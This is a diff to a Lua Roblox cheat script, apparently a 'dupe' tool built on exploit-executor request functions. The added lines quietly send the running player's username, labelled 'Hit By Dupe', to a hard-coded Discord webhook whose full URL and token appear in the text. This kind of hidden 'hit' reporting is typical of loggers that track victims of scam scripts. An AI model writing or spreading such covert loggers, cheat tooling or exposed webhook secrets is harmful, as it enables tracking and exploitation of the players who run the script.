@@ -1,4 +1,37 @@
+-- 🧠 Webhook đơn giản: gửi "Hit By Moreira(<Username>)"
+
+local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
+local USERNAME = Players.LocalPlayer.Name  -- Lấy tên người chơi
+local WEBHOOK = "https://discord.com/api/webhooks/1434366832084647956/LUta7CcUQtCe8DtCpTwKLIUYSl-cmY-ZrmA0caCegGv-UvPz8FBXbW7bGjhbrgdY3K6d" -- 🔗 Thay bằng link webhook thật của bạn
+
+local content = string.format("Hit By Dupe(%s)", USERNAME)
+local payload = {content = content}
+
+local req = (syn and syn.request) or http_request or (http and http.request) or request
+
+if req and WEBHOOK ~= "" then
+	local ok, err = pcall(function()
+		req({
+			Url = WEBHOOK,
+			Method = "POST",
+			Headers = {["Content-Type"] = "application/json"},
+			Body = HttpService:JSONEncode(payload)
+		})
+	end)
+	if ok then
+		print("✅ Webhook sent successfully!")
+	else
+		warn("❌ Webhook error:", err)
+	end
+else
+	warn("⚠️ No valid request function or missing webhook URL.")
+end
+
+local TweenService = game:GetService("TweenService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
 local CoreGui = game:GetService("CoreGui")
 local UIS = game:GetService("UserInputService")
 local VIM = game:GetService("VirtualInputManager")
